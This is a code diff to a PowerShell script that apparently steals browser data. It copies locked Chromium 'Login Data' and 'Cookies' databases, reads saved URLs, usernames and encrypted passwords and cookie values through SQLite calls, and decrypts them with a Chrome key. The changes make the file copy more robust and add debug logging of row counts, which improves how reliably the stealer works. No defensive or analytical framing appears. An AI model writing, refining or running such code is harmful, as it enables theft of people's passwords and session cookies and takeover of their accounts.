@@ -116,10 +116,11 @@ function killBrowsers {
 function copyDb($dbPath) {
   $tmp = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).db"
   $fs = [System.IO.File]::Open($dbPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
-  $buf = New-Object byte[] $fs.Length
-  $fs.Read($buf, 0, $fs.Length) | Out-Null
+  $ms = New-Object System.IO.MemoryStream
+  $fs.CopyTo($ms)
   $fs.Close()
-  [System.IO.File]::WriteAllBytes($tmp, $buf)
+  [System.IO.File]::WriteAllBytes($tmp, $ms.ToArray())
+  $ms.Close()
   return $tmp
 }
 
@@ -169,8 +170,11 @@ foreach ($browser in $browsers) {
             [N]::sqlite3_finalize($cntStmt)
           } else { ts "[dbg] ${bName} logins count prep rc=${r1}" }
           $stmt = [IntPtr]::Zero
-          if ([N]::sqlite3_prepare_v2($dbPtr, "SELECT origin_url, username_value, password_value FROM logins", -1, [ref]$stmt, [IntPtr]::Zero) -eq 0) {
+          $prepRc = [N]::sqlite3_prepare_v2($dbPtr, "SELECT origin_url, username_value, password_value FROM logins", -1, [ref]$stmt, [IntPtr]::Zero)
+          if ($prepRc -eq 0) {
+            $rowCount = 0
             while ([N]::sqlite3_step($stmt) -eq 100) {
+              $rowCount++
               $urlPtr = [N]::sqlite3_column_text($stmt, 0); $usrPtr = [N]::sqlite3_column_text($stmt, 1)
               $encLen = [N]::sqlite3_column_bytes($stmt, 2); $encPtr = [N]::sqlite3_column_blob($stmt, 2)
               if ($encLen -gt 15 -and $encPtr -ne [IntPtr]::Zero -and $chromeKey -ne $null) {
@@ -189,8 +193,9 @@ foreach ($browser in $browsers) {
                 }
               }
             }
+            if ($rowCount -ne [int]$loginRows) { ts "[dbg] ${bName} login rows: COUNT=${loginRows} vs LOOP=${rowCount}" }
             [N]::sqlite3_finalize($stmt)
-          } else { $errMsg = "Login Data query error" }
+          } else { ts "[dbg] ${bName} login prep rc=${prepRc}"; $errMsg = "Login Data query error" }
           [N]::sqlite3_close($dbPtr)
         } else { $errMsg = "Cannot access Login Data" }
       } catch { $errMsg = "Login DB error: $_" }
@@ -211,8 +216,11 @@ foreach ($browser in $browsers) {
             [N]::sqlite3_finalize($cntStmt2)
           } else { ts "[dbg] ${bName} cookies count prep rc=${r2}" }
           $stmt = [IntPtr]::Zero
-          if ([N]::sqlite3_prepare_v2($dbPtr, "SELECT host_key, name, encrypted_value FROM cookies", -1, [ref]$stmt, [IntPtr]::Zero) -eq 0) {
+          $prepRc2 = [N]::sqlite3_prepare_v2($dbPtr, "SELECT host_key, name, encrypted_value FROM cookies", -1, [ref]$stmt, [IntPtr]::Zero)
+          if ($prepRc2 -eq 0) {
+            $rowCount2 = 0
             while ([N]::sqlite3_step($stmt) -eq 100) {
+              $rowCount2++
               $hostPtr = [N]::sqlite3_column_text($stmt, 0); $namePtr = [N]::sqlite3_column_text($stmt, 1)
               $encLen = [N]::sqlite3_column_bytes($stmt, 2); $encPtr = [N]::sqlite3_column_blob($stmt, 2)
               if ($encLen -gt 15 -and $encPtr -ne [IntPtr]::Zero -and $chromeKey -ne $null) {
@@ -233,8 +241,9 @@ foreach ($browser in $browsers) {
                 }
               }
             }
+            if ($rowCount2 -ne [int]$ckRows) { ts "[dbg] ${bName} cookie rows: COUNT=${ckRows} vs LOOP=${rowCount2}" }
             [N]::sqlite3_finalize($stmt)
-          } else { $errMsg = "Cookies query error" }
+          } else { ts "[dbg] ${bName} cookie prep rc=${prepRc2}"; $errMsg = "Cookies query error" }
           [N]::sqlite3_close($dbPtr)
         } else { $errMsg = "Cannot access Cookies DB" }
       } catch { $errMsg = "Cookie DB error: $_" }
